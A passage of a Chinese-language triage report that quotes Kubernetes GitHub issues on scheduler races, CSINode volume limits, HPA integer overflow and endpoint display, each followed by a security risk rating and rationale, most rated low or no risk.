该Issue描述了在更新静态Pod（kube-apiserver）的yaml文件时，静态Pod可能会卡在“Waiting for volumes to unmount for pod”状态长达20分钟到2小时。重启kubelet可以使静态Pod快速启动。

**风险评估：**

从安全风险的角度分析，该问题可能导致kube-apiserver在较长时间内不可用，这可能会影响集群的可用性。然而，造成该问题的操作是更新静态Pod的yaml文件，这通常需要对节点拥有root权限或其他高权限。因此，攻击者需要具有高权限才能实施该攻击。

根据风险判断标准中的第4条：“在风险为拒绝服务（DoS）攻击时，如果攻击者需要一定权限才能够实施该攻击，则视情况需要降级处理，当漏洞利用需要攻击者具备创建、修改等非只读权限时，则不应判断为高风险，CVSS评级在high以下。”

因此，该问题属于安全风险，但由于需要高权限才能利用，因此风险评级为低风险。

**可能影响：**

当发生该问题时，kube-apiserver可能长时间不可用，这会影响集群的管理和调度功能。但由于需要高权限才能触发，该问题不太可能被远程攻击者利用。

---

## Issue #126700 [Bug] Scheduler fails to schedule a pod due to a race condition

- Issue 链接：[#126700](https://github.com/kubernetes/kubernetes/issues/126700)

### Issue 内容

#### What happened?

A bug in the scheduler increases the time spent on scheduling a pod **from <1 second to 5 minutes**.

We discovered the bug when repeating the steps described in a fixed bug report [#106780](https://github.com/kubernetes/kubernetes/issues/106780). The setting and steps are as follows:

We have 1 node with 32Gi memory, and 3 pods to schedule: 
p1 / request 10Gi memory / low-priority,
p2 / request 25Gi memory / medium-priority,
p3 / request 20Gi memory / high-priority.

We perform the following steps:
1. add `p1` and wait until `p1` is running
2. add `p2` and wait until `p1` is terminating; this is because there are not enough resources to host both pods and `p2` has a higher priority.
**Note that at this point, `p2` is not running yet.**
3. add `p3` and wait until `p3` is running; `p2` is pending because `p2` and `p3` cannot coexist on `node0`.
4. re-add `p1` and wait until `p1` is running; `p1` should be able to run since there are enough resources to host both pods: 10 + 20 < 32

Interestingly, we find that if step 4 happened immediately after step 3, then `p1` fails to get scheduled with the reason `Insufficient Memory` and eventually gets scheduled after 5 minutes. If there is some short period between step 3 and step 4 (say 2 seconds), then `p1` is scheduled properly immediately.

##### What is the root cause?

After code and log inspections (see below), we have found the root cause of this bug: it's caused by the race condition between (A) `p1` is re-added and handled by the scheduler and (B) `p2`'s `nominated_node_name` is cleared. If A happens before B, then the bug occurs.

##### Why does 2 second make the difference?

The reason is that `p2`'s `nominated_node_name` is cleared *when it (a nominated pod) is scheduled again and failed*. But as the `p2`'s first schedule failed (need to wait for preemption to finish), it's put to BackoffQueue and need to wait for a few seconds before it's put back to ActionQueue and scheduled again.

So 
1. If `p1` is added before `p2` is scheduled again (without 2s sleep), it will **fail** as `p2`'s `nomianted_node_name` is not cleared.
2. But if we add the 2s sleep, `p2` is scheduled again and its `nominated_node_name` is cleared before `p1` is added. In this case, `p1` will be **schedulable** to node0.

<details><summary>Some scheduler logs of the bug-free and buggy trace</summary>
The lines starting with # are logged just before scheduling p1 and p2. You can notice that their order is reversed in the two traces.

Bug-free trace (B happens before A):
```markdown
# with sleep(2s)
I0814 14:19:47.939731   32287 eventhandlers.go:149] "Add event for unscheduled pod" pod="default/p3"
I0814 14:19:47.939756   32287 schedule_one.go:83] "About to try and schedule pod" pod="default/p3"
I0814 14:19:47.939768   32287 schedule_one.go:96] "Attempting to schedule pod" pod="default/p3"
I0814 14:19:47.939878   32287 default_binder.go:53] "Attempting to bind pod to node" logger="Bind.DefaultBinder" pod="default/p3" node="node0"
I0814 14:19:47.944902   32287 eventhandlers.go:313] "Delete event for scheduled pod" pod="default/p1"
I0814 14:19:47.948208   32287 scheduling_queue.go:1312] "Pod moved to an internal scheduling queue" pod="default/p2" event="AssignedPodDelete" queue="Backoff" hint=1
I0814 14:19:47.948799   32287 schedule_one.go:314] "Successfully bound pod to node" pod="default/p3" node="node0" evaluatedNodes=1 feasibleNodes=1
I0814 14:19:47.948891   32287 eventhandlers.go:201] "Delete event for unscheduled pod" pod="default/p3"
I0814 14:19:47.948901   32287 eventhandlers.go:231] "Add event for scheduled pod" pod="default/p3"
I0814 14:19:47.956662   32287 eventhandlers.go:268] "Update event for scheduled pod" pod="default/p3"
I0814 14:19:49.047040   32287 schedule_one.go:83] "About to try and schedule pod" pod="default/p2"
# I0814 14:19:49.047238   32287 schedule_one.go:96] "Attempting to schedule pod" pod="default/p2"
I0814 14:19:49.047886   32287 schedule_one.go:1055] "Unable to schedule pod; no fit; waiting" pod="default/p2" err="0/1 nodes are available: 1 Insufficient memory. preemption: 0/1 nodes are available: 1 No preemption victims found for incoming pod."
I0814 14:19:49.048895   32287 schedule_one.go:1122] "Updating pod condition" pod="default/p2" conditionType="PodScheduled" conditionStatus="False" conditionReason="Unschedulable"
I0814 14:19:49.064048   32287 eventhandlers.go:174] "Update event for unscheduled pod" pod="default/p2"
I0814 14:19:49.978428   32287 eventhandlers.go:149] "Add event for unscheduled pod" pod="default/p1"
I0814 14:19:49.978562   32287 schedule_one.go:83] "About to try and schedule pod" pod="default/p1"
# I0814 14:19:49.978580   32287 schedule_one.go:96] "Attempting to schedule pod" pod="default/p1"
I0814 14:19:49.978879   32287 default_binder.go:53] "Attempting to bind pod to node" logger="Bind.DefaultBinder" pod="default/p1" node="node0"
I0814 14:19:49.985438   32287 eventhandlers.go:201] "Delete event for unscheduled pod" pod="default/p1"
I0814 14:19:49.985476   32287 eventhandlers.go:231] "Add event for scheduled pod" pod="default/p1"
I0814 14:19:49.985747   32287 schedule_one.go:314] "Successfully bound pod to node" pod="default/p1" node="node0" evaluatedNodes=1 feasibleNodes=1
```

Buggy trace (A happens before B):
```markdown
# without sleep(2s)
I0814 14:17:47.151445   31615 eventhandlers.go:149] "Add event for unscheduled pod" pod="default/p3"
I0814 14:17:47.151515   31615 eventhandlers.go:174] "Update event for unscheduled pod" pod="default/p2"
I0814 14:17:47.151802   31615 schedule_one.go:83] "About to try and schedule pod" pod="default/p3"
I0814 14:17:47.151812   31615 schedule_one.go:96] "Attempting to schedule pod" pod="default/p3"
I0814 14:17:47.151926   31615 default_binder.go:53] "Attempting to bind pod to node" logger="Bind.DefaultBinder" pod="default/p3" node="node0"
I0814 14:17:47.156395   31615 eventhandlers.go:313] "Delete event for scheduled pod" pod="default/p1"
I0814 14:17:47.156444   31615 scheduling_queue.go:1312] "Pod moved to an internal scheduling queue" pod="default/p2" event="AssignedPodDelete" queue="Backoff" hint=1
I0814 14:17:47.160464   31615 eventhandlers.go:201] "Delete event for unscheduled pod" pod="default/p3"
I0814 14:17:47.160479   31615 eventhandlers.go:231] "Add event for scheduled pod" pod="default/p3"
I0814 14:17:47.160514   31615 schedule_one.go:314] "Successfully bound pod to node" pod="default/p3" node="node0" evaluatedNodes=1 feasibleNodes=1
I0814 14:17:47.168539   31615 eventhandlers.go:268] "Update event for scheduled pod" pod="default/p3"
I0814 14:17:47.177608   31615 eventhandlers.go:149] "Add event for unscheduled pod" pod="default/p1"
I0814 14:17:47.177642   31615 schedule_one.go:83] "About to try and schedule pod" pod="default/p1"
# I0814 14:17:47.177650   31615 schedule_one.go:96] "Attempting to schedule pod" pod="default/p1"
I0814 14:17:47.177775   31615 schedule_one.go:1055] "Unable to schedule pod; no fit; waiting" pod="default/p1" err="0/1 nodes are available: 1 Insufficient memory. preemption: 0/1 nodes are available: 1 No preemption victims found for incoming pod."
I0814 14:17:47.177802   31615 schedule_one.go:1122] "Updating pod condition" pod="default/p1" conditionType="PodScheduled" conditionStatus="False" conditionReason="Unschedulable"
I0814 14:17:47.187472   31615 eventhandlers.go:174] "Update event for unscheduled pod" pod="default/p1"
I0814 14:17:48.138665   31615 schedule_one.go:83] "About to try and schedule pod" pod="default/p2"
# I0814 14:17:48.139950   31615 schedule_one.go:96] "Attempting to schedule pod" pod="default/p2"
I0814 14:17:48.140305   31615 schedule_one.go:1055] "Unable to schedule pod; no fit; waiting" pod="default/p2" err="0/1 nodes are available: 1 Insufficient memory. preemption: 0/1 nodes are available: 1 No preemption victims found for incoming pod."
I0814 14:17:48.140582   31615 schedule_one.go:1122] "Updating pod condition" pod="default/p2" conditionType="PodScheduled" conditionStatus="False" conditionReason="Unschedulable"
I0814 14:17:48.156537   31615 eventhandlers.go:174] "Update event for unscheduled pod" pod="default/p2"
```
</details>

##### How to fix it?

1. A potential fix is:
Register all plugins that need to be aware of pods to events triggered by updates to a pod's `nominated_node_name`. This way, a failed pod will be retried as soon as any pod's `nominated_node_name` is cleared.

2. If this is too radical and can cause performance issues, another solution is: 
When a pod is bound to a node with nominated pods, either 
a) re-check the previously nominated pods (that nominated to this node), 
b) or clear the `nominated_node_name` of these nominated pods.
In this way, upcoming pods won't fail unreasonably and won't have to wait 5 minutes for the next retry.


#### What did you expect to happen?

`p1` should be immediately scheduled.


#### How can we reproduce it (as minimally and precisely as possible)?

We're using [kwok](https://kwok.sigs.k8s.io/) to reproduce this issue.

```yaml
# node0.yaml
apiVersion: v1
kind: Node
metadata:
  name: node0
  labels:
    kubernetes.io/hostname: node0
status:
  allocatable:
    cpu: "32"
    memory: "32Gi"
    pods: "110"
  capacity:
    cpu: "32"
    memory: "32Gi"
    pods: "110"
```

```yaml
# p1.yaml
apiVersion: v1
kind: Pod
metadata:
  name: p1
spec:
  containers:
  - name: p1-container
    image: nginx
    resources:
      requests:
        memory: "10Gi"

  priorityClassName: low-priority
```

```yaml
# p2.yaml
apiVersion: v1
kind: Pod
metadata:
  name: p2
spec:
  containers:
  - name: p2-container
    image: nginx
    resources:
      requests:
        memory: "25Gi"
  priorityClassName: medium-priority
```

```yaml
# p3.yaml
apiVersion: v1
kind: Pod
metadata:
  name: p3
spec:
  containers:
  - name: p3-container
    image: nginx
    resources:
      requests:
        memory: "20Gi"
  priorityClassName: high-priority
```

```yaml
# priority_class.yaml
apiVersion: scheduling.k8s.io/v1
kind: PriorityClass
metadata:
  name: high-priority
value: 1000000
globalDefault: false
description: "This priority class should be used for XYZ service pods only."
---
apiVersion: scheduling.k8s.io/v1
kind: PriorityClass
metadata:
  name: medium-priority
value: 500000
globalDefault: false
description: "This priority class should be used for XYZ service pods only."
---
apiVersion: scheduling.k8s.io/v1
kind: PriorityClass
metadata:
  name: low-priority
value: 0
globalDefault: false
description: "This priority class should be used for XYZ service pods only."
```


```python
# To run this reproduction script, please create a new KWOK cluster first.
# kwokctl create cluster --v DEBUG
# Also need to install the kubernetes python client library,
# and place all yaml files in the same folder with the script.
# ---
# To check the scheduler logs:
# kwokctl logs kube-scheduler
# ---
# To reproduce the bug case, please comment out `sleep(2)` between step 5 and step 6.
# To reproduce the normal case, please add `sleep(2)` between step 5 and step 6.
import unittest
import time
import shutil
import logging
from time import sleep
from os import path, makedirs
from logging import getLogger
from kubernetes import config, watch
from kubernetes.client import *
from kubernetes.utils import *
from time import strftime

logger = getLogger(__name__)
config.load_kube_config()
v1 = CoreV1Api()
k8s_cli = ApiClient()


log_dir = path.dirname(__file__)

if __name__ == "__main__":
    log_path = path.join(log_dir, f"issue-106780-reproduction-{strftime('%Y-%m-%d-%H-%M-%S')}")
    shutil.rmtree(log_path, ignore_errors=True)
    makedirs(log_path, exist_ok=True)
    log_file = path.join(log_path, 'reproduce.log')
    logging.basicConfig(level=logging.INFO,
                        filemode='w',
                        filename=log_file,
                        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                        datefmt='%H:%M:%S')
    node0_yaml = path.join(path.dirname(__file__), 'node0.yaml')
    p1_yaml = path.join(path.dirname(__file__), 'p1.yaml')
    p2_yaml = path.join(path.dirname(__file__), 'p2.yaml')
    p3_yaml = path.join(path.dirname(__file__), 'p3.yaml')
    priority_class_yaml = path.join(path.dirname(__file__), 'priority_class.yaml')
    w = watch.Watch()

    # 1. create priority class
    create_from_yaml(k8s_client=k8s_cli, yaml_file=priority_class_yaml)
    logger.info(f"PriorityClass created")

    # 2. add node0
    create_from_yaml(k8s_client=k8s_cli, yaml_file=node0_yaml)
    logger.info(f"Node: node0 created")

    # 3. add p1
    create_from_yaml(k8s_client=k8s_cli, yaml_file=p1_yaml)
    logger.info(f"Pod: p1 added")

    # 3. check p1 is running
    p1_running = False
    for event in w.stream(v1.list_namespaced_pod,
                          field_selector=f'metadata.name=p1',
                          namespace="default",
                          timeout_seconds=int(5)):
        p1 = event['object']
        if event['object'].status.phase == "Running":
            p1_running = True
            logger.info(f"Pod: {p1.metadata.name} scheduled on node {p1.spec.node_name}")
            break
    assert p1_running

    # 4. add p2
    create_from_yaml(k8s_client=k8s_cli, yaml_file=p2_yaml)
    logger.info(f"Pod: p2 added")

    # 4. check p1 is terminating (by p2)
    for event in w.stream(v1.list_namespaced_pod,
                          field_selector=f'metadata.name=p1',
                          namespace="default",
                          timeout_seconds=int(3)):
        logger.info(f"Pod: {event['object'].metadata.name}, event: {event['type']}")
        logger.info(
            f"deletion_timestamp: {event['object'].metadata.deletion_timestamp}, status: {event['object'].status.phase}")
        if event['object'].metadata.deletion_timestamp is not None and event['object'].status.phase in (
        'Pending', 'Running'):
            logger.info(f"Pod: {p1.metadata.name} is terminating")
            break

    # 5. add p3 and wait for p3 running (p3 will terminate p2 / let p2 pending)
    create_from_yaml(k8s_client=k8s_cli, yaml_file=p3_yaml)
    p3_running = False
    for event in w.stream(v1.list_namespaced_pod,
                          field_selector=f'metadata.name=p3',
                          namespace="default",
                          timeout_seconds=int(5)):
        p3 = event['object']
        if p3.status.phase == "Running":
            logger.info(f"Pod: {p3.metadata.name} scheduled on node p3")
            p3_running = True
            break
    assert p3_running

    # sleep(2)  # -> without this on 1.30.2 will cause pod scheduled failed at the first try

    # 6. reapply and check p1 schedulable
    create_from_yaml(k8s_client=k8s_cli, yaml_file=p1_yaml)
    tic = time.time()
    logger.info(f"Pod: p1 re-applied")

    # 7. watch pod1 events and wait it to be scheduled
    p1_running = False
    for event in w.stream(v1.list_namespaced_pod,
                          field_selector=f'metadata.name=p1',
                          namespace="default",
                          timeout_seconds=int(600)):
        p1 = event['object']
        if p1.status.phase == "Running":
            p1_running = True
            logger.info(f"Pod: {p1.metadata.name} scheduled on node {p1.spec.node_name}")
            break

    if not p1_running:
        logger.error(f"Pod: {p1.metadata.name} is not scheduled in 600s")
        assert False
    else:
        logger.info(f"Pod: {p1.metadata.name}, " + f"time between add and scheduled: {time.time() - tic}")


```


#### Anything else we need to know?

Tested on 1.30.2

/sig bugs scheduling

#### Kubernetes version

<details>

Tested on 1.30.2

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该Issue报告了Kubernetes调度器中的一个竞态条件漏洞，在特定条件下，会导致调度器调度一个Pod的时间从小于1秒增加到5分钟。这可能导致服务不可用，即拒绝服务（DoS）攻击的风险。

攻击者如果能够利用该漏洞，可能通过构造特定的Pod和调度顺序，使调度器延迟调度其他Pod，影响集群的可用性。然而，要利用该漏洞，攻击者需要能够创建具有特定配置的Pod，包括设置优先级、资源请求等参数。

根据风险判断标准第4条，当漏洞利用需要攻击者具备创建、修改等非只读权限时，则不应判断为高风险，CVSS评级在high以下。

因此，该Issue存在安全风险，但风险评级为“低风险”。

---

## Issue #126922 describe service endpoints shows endpoints that are not ready

- Issue 链接：[#126922](https://github.com/kubernetes/kubernetes/issues/126922)

### Issue 内容

#### What happened?

After upgrading from 1.29 to 1.30.2 `kubectl describe service` in the endpoints section shows all endpoints even if pods are not ready and `kubectl get endpoints` is not showing the endpoint.
Before upgrading, all pods that are not ready were not shown in the endpoints section.

#### What did you expect to happen?

IP of pods that are not ready should not be shown in `kubectl describe service` Endpoints section.

#### How can we reproduce it (as minimally and precisely as possible)?

Make pod readyness probe will fail:
```kubectl get pods pkad-health -o wide
NAME          READY   STATUS    RESTARTS      AGE    IP          NODE             NOMINATED NODE   READINESS GATES
pkad-health   0/1     Running   2 (94m ago)   119m   10.1.0.19   docker-desktop   <none>           <none>
```

In the service describe Endpoints section it should not be visable
```
kubectl describe svc pkad
Name:                     pkad
Namespace:                default
Labels:                   <none>
Annotations:              <none>
Selector:                 szkolenie=k8s
Type:                     ClusterIP
IP Family Policy:         SingleStack
IP Families:              IPv4
IP:                       10.106.116.19
IPs:                      10.106.116.19
Port:                     <unset>  8080/TCP
TargetPort:               8080/TCP
Endpoints:                10.1.0.19:8080
Session Affinity:         None
Internal Traffic Policy:  Cluster
Events:                   <none>


kubectl get endpoints pkad
NAME   ENDPOINTS   AGE
pkad               121m

```


#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.0
Kustomize Version: v5.4.2
Server Version: v1.30.2
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

tested on docker desktop and DigitalOcean Kuberentes service.

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该Issue描述了在升级Kubernetes版本后，`kubectl describe service`命令显示了未准备就绪（Not Ready）的Pod的Endpoints信息，而`kubectl get endpoints`命令则没有显示这些Endpoints。按照预期，未准备就绪的Pod的IP不应出现在服务的Endpoints列表中。

**安全风险分析：**

1. **信息泄露风险**：未准备就绪的Pod可能包含尚未完全配置或存在安全漏洞的实例，暴露其IP地址可能导致信息泄露。

2. **攻击面扩大**：攻击者可能利用已知的Pod IP进行内部网络探测，尝试访问未准备就绪的Pod，增加攻击面的可能性。

**风险评估：**

根据风险判断标准，攻击者需要具备执行`kubectl describe service`命令的权限，通常需要一定的集群读取权限。由于攻击者需要一定权限才能实施该攻击，且暴露的IP为集群内部IP，外部无法直接访问，利用价值有限。因此，综合判断该风险评级为**低风险**。

---

## Issue #126921 Deletion of csi-node-plugin Pod causes driver entry to be removed from CSINode object; kube-scheduler schedules more than driver's allocatable

- Issue 链接：[#126921](https://github.com/kubernetes/kubernetes/issues/126921)

### Issue 内容

#### What happened?

With @plkokanov we hit in our environments the following issue multiple times:
```
% k -n shoot--foo--bar describe po etcd-main-0

Events:
  Type     Reason              Age                 From                     Message
  ----     ------              ----                ----                     -------
  Warning  FailedAttachVolume  35s (x47 over 80m)  attachdetach-controller  AttachVolume.Attach failed for volume "pv-shoot--shik--shak-1234" : rpc error: code = Internal desc = Attach volume /subscriptions/<omitted>/resourceGroups/shoot--shik--shak/providers/Microsoft.Compute/disks/pv-shoot--shik--shak-1234 to instance shoot--shik--shak-cpu-worker-etcd-z1-6c956-mhcw5 failed with Retriable: false, RetryAfter: 0s, HTTPStatusCode: 409, RawError: {\r
  "error": {\r
    "code": "OperationNotAllowed",\r
    "message": "The maximum number of data disks allowed to be attached to a VM of this size is 16.",\r
    "target": "dataDisks"\r
  }\r
}
```

When we checked, the CSINode object for the corresponding Node was reporting the correct volume attachment limit:
```
% k get csinode shoot--shik--shak-cpu-worker-etcd-z1-6c956-mhcw5 -o yaml

spec:
  drivers:
  # ...
  - allocatable:
      count: 16
    name: disk.csi.azure.com
    nodeID: shoot--shik--shak-cpu-worker-etcd-z1-6c956-mhcw5
    topologyKeys:
    - topology.disk.csi.azure.com/zone
    - topology.kubernetes.io/zone
```

According to the Node status and according to the VM state in Azure, it had already 16 disks attached.
```
% k get no shoot--shik--shak-cpu-worker-etcd-z1-6c956-mhcw5 -o json | jq '.status.volumesAttached | length'
16

% az vm show -g shoot--shik--shak --name shoot--shik--shak-cpu-worker-etcd-z1-6c956-mhcw5 | jq '.storageProfile.dataDisks | length'
16
```

kube-scheduler wrongly sheduled a Pod with a volume to the `shoot--shik--shak-cpu-worker-etcd-z1-6c956-mhcw5` Node as the Node already had its volume attachments limit reached.

We found that this happens due to csi-node-plugin Pod deletion. On deletion of this Pod, we see that the driver section from the CSINode object is removed and it is added only when the new csi-node-plugin Pod starts.

The corresponding handling in kube-scheduler's NodeVolumeLimits plugin is: https://github.com/kubernetes/kubernetes/blob/a7242fcff768658019f878cb691583dcbcfefb2d/pkg/scheduler/framework/plugins/nodevolumelimits/csi.go#L197-L201

If we fail to fetch the limit from the CSINode object, kube-scheduler let's the Pod to be scheduled.

#### What did you expect to happen?

kube-scheduler to do not schedule Pods with volumes to Nodes that already have their volume attachment limit reached.

#### How can we reproduce it (as minimally and precisely as possible)?

To reproduce the removal of the driver section after csi-node-plugin Pod deletion:

1. Start watching the CSINode object:
```
 k get csinode "$NODENAME" -w -o yaml > "~/csinode-$NODENAME.yaml"
```

2. In a new terminal window delete the csi-node-plugin Pod

3. Make sure that the CSINode object watch is as follows:
```yaml
apiVersion: storage.k8s.io/v1
kind: CSINode
metadata:
  name: node-1
spec:
  drivers:
  - allocatable:
      count: 8
    name: disk.csi.azure.com
    nodeID: node-1
    topologyKeys:
    - topology.disk.csi.azure.com/zone
    - topology.kubernetes.io/zone
---
apiVersion: storage.k8s.io/v1
kind: CSINode
metadata:
  name: node-1
spec:
  drivers: null
---
apiVersion: storage.k8s.io/v1
kind: CSINode
metadata:
  name: node-1
spec:
  drivers:
  - allocatable:
      count: 8
    name: disk.csi.azure.com
    nodeID: node-1
    topologyKeys:
    - topology.disk.csi.azure.com/zone
    - topology.kubernetes.io/zone
```

Note: The non-relevant fields are removed from the example output above.

You can see that until the new csi-node-plugin is scheduled and started, the CSINode object does not contain any information about the driver. We see that during that time kube-scheduler schedules new Pods with volumes to that Node.
The kube-scheduler plugin for respecting the Node volume limit is: https://github.com/kubernetes/kubernetes/blob/a7242fcff768658019f878cb691583dcbcfefb2d/pkg/scheduler/framework/plugins/nodevolumelimits/csi.go


#### Anything else we need to know?

We use VPA to scale the csi-node-plugin Pod. That's why it can be evicted and restarted.

#### Kubernetes version

<details>

```console
$ kubectl version

Server Version: v1.29.4
```

</details>


#### Cloud provider

<details>
Azure and AWS
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>
Gardener
</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
[azuredisk-csi-driver](https://github.com/kubernetes-sigs/azuredisk-csi-driver): v1.30.0
</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该Issue描述了当csi-node-plugin Pod被删除时，CSINode对象中的driver信息会被临时移除，导致kube-scheduler无法获取节点的卷限制信息。在此期间，kube-scheduler可能会将需要挂载卷的Pod调度到已经达到卷附件上限的节点上，从而导致卷附件失败。这可能引发关键服务的中断，属于潜在的拒绝服务（DoS）风险。

然而，攻击者要利用此漏洞，需要具备删除csi-node-plugin Pod的权限，并能够创建需要卷的Pod。这通常是管理员或具有高权限的用户才能执行的操作，普通用户无法实现。

根据风险判断标准第4条，针对需要一定权限才能实施的DoS攻击，应适当降级处理。当漏洞利用需要攻击者具备创建、修改等非只读权限时，不应判断为高风险，CVSS评级在high以下。

因此，此Issue存在安全风险，但风险评级为低风险。

---

## Issue #126892 Int overflow in hpa causing incorrect replica count

- Issue 链接：[#126892](https://github.com/kubernetes/kubernetes/issues/126892)

### Issue 内容

#### What happened?

The setup:
I am using keda with the prometheus scaler. The query I am using, returns the lag in the message queue i am using, and the threshold is set to `0.1`.

What happened:
The lag was increasing for a long time, and the replica count reached the max setting as expected. Everything was running fine for some time. When the lag value reached `214,748,364` hpa decided to reduce the replicas from the max limit to `1`.

What I think is the problem:
When the lag passes `214,748,364`, the calculation [here](https://github.com/kubernetes/kubernetes/blob/7b80cdb66a390f225d23cd612950144e3a39d1ae/pkg/controller/podautoscaler/replica_calculator.go#L278) divides by the threshold `0.1` and it passes the max int32 value. causing hpa to scale to the minimum value, 1.
It also seems like a lot of other places in this file cast a 64 bit float to a 32 bit int. Should there maybe be a check everywhere this is done?

#### What did you expect to happen?

I expected the replica count to stay at the max value. Or alternatively, get an error that we have reached the max value for an external metric value

#### How can we reproduce it (as minimally and precisely as possible)?

Use an external metric, and set it above `214,748,364` with a threshold of `0.1`.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
1.29
</details>


#### Cloud provider

<details>
aws eks
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该Issue报告了在使用KEDA与Prometheus scaler时，当外部指标（消息队列延迟）超过214,748,364并与阈值0.1进行计算时，发生了整数溢出，导致HPA（Horizontal Pod Autoscaler）将副本数量从最大值缩减到1。此问题可能导致服务可用性受到影响。

从安全角度分析，攻击者如果能够控制或干扰外部指标，使其超过整数限制，可能诱导HPA错误地缩小副本数量，导致服务的拒绝服务（DoS）攻击。然而，这需要攻击者具备对Prometheus指标或消息队列的控制权限，通常不属于低权限或未授权的攻击行为。根据风险判断标准第4条，若攻击者需要一定权限才能实施该攻击，则不应判断为高风险。

因此，该问题存在一定的安全风险，但由于需要较高的权限才能被利用，风险评级为低风险。

---

# ✅ 不涉及安全风险的 Issues (56 个)

## Issue #126515 Secret Creation for Service Account Does Not Populate secrets Field

- Issue 链接：[#126515](https://github.com/kubernetes/kubernetes/issues/126515)

### Issue 内容

#### What happened?

I used the following command in Kubernetes to create a secret with the token of the prometheus-agent service account:
```
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Secret
metadata:
  annotations:
    kubernetes.io/service-account.name: prometheus-agent
  name: get-prometheus-sa-token
  namespace: kube-system
type: kubernetes.io/service-account-token
EOF
```

However, when I check the prometheus-agent service account using the command kubectl get sa prometheus-agent -n kube-system, I found that the secrets field is still 0.

#### What did you expect to happen?

I expected the secrets field of the prometheus-agent service account to be populated with the created secret.

#### How can we reproduce it (as minimally and precisely as possible)?

Create a Kubernetes cluster (any version >= 1.24).
Use the provided kubectl apply -f - command to create the secret.
Check the secrets field of the prometheus-agent service account using kubectl get sa prometheus-agent -n kube-system.

#### Anything else we need to know?

I am willing to fix this potential bug (need confirmation if this is indeed a bug). The proposed solution involves updating the ServiceAccount (SA) information when renewing the tokens for secrets. However, I would like to confirm this approach beforehand.

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.24.15-vke.32
```

</details>


#### Cloud provider

<details>
Volcano Engine
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在Kubernetes 1.24及以上版本中，用户通过创建类型为`kubernetes.io/service-account-token`的Secret并指定了`prometheus-agent`服务账号，希望该Secret能够关联到该服务账号的`secrets`字段中，但是发现`secrets`字段仍然为空。

这是由于Kubernetes在1.24版本及以上，对服务账号令牌的管理方式发生了变化。现在，服务账号令牌不再通过创建Secret的方式生成，而是通过TokenRequest API动态获取。因此，手动创建的Secret不会自动关联到服务账号的`secrets`字段。

该Issue反映的是Kubernetes版本升级后服务账号令牌管理方式变化导致的功能性问题，并不涉及任何潜在的安全风险。

根据风险判断标准，尤其是标准6：“如果Issue不涉及安全问题，则风险评级判断为不涉及”。

因此，该Issue不涉及安全风险。

---

## Issue #126514 You have to remove that sandbox to be able to reuse that name.

- Issue 链接：[#126514](https://github.com/kubernetes/kubernetes/issues/126514)

### Issue 内容

#### What happened?

When power is turned off and restarted, `kubelet `reports an error when starting etcd and apiserver:
Aug 02 10:01:03 openEuler kubelet[1024]: E0802 10:01:03.693078    1024 remote_runtime.go:193] "RunPodSandbox from runtime service failed" err="rpc error: code = Unknown desc = Conflict. The name \"k8s_POD_etcd-openeuler_kube-system_ae0fcba533f9b951c6983487becf13f9_0\" is already in use by sandbox 30ed179087f03d03fef197363103427e48242829f815488bb774313db02c41a4. You have to remove that sandbox to be able to reuse that name."
Aug 02 10:01:03 openEuler kubelet[1024]: E0802 10:01:03.693228    1024 kuberuntime_sandbox.go:72] "Failed to create sandbox for pod" err="rpc error: code = Unknown desc = Conflict. The name \"k8s_POD_etcd-openeuler_kube-system_ae0fcba533f9b951c6983487becf13f9_0\" is already in use by sandbox 30ed179087f03d03fef197363103427e48242829f815488bb774313db02c41a4. You have to remove that sandbox to be able to reuse that name." pod="kube-system/etcd-openeuler"
Aug 02 10:01:03 openEuler kubelet[1024]: E0802 10:01:03.693276    1024 kuberuntime_manager.go:1166] "CreatePodSandbox for pod failed" err="rpc error: code = Unknown desc = Conflict. The name \"k8s_POD_etcd-openeuler_kube-system_ae0fcba533f9b951c6983487becf13f9_0\" is already in use by sandbox 30ed179087f03d03fef197363103427e48242829f815488bb774313db02c41a4. You have to remove that sandbox to be able to reuse that name." pod="kube-system/etcd-openeuler"
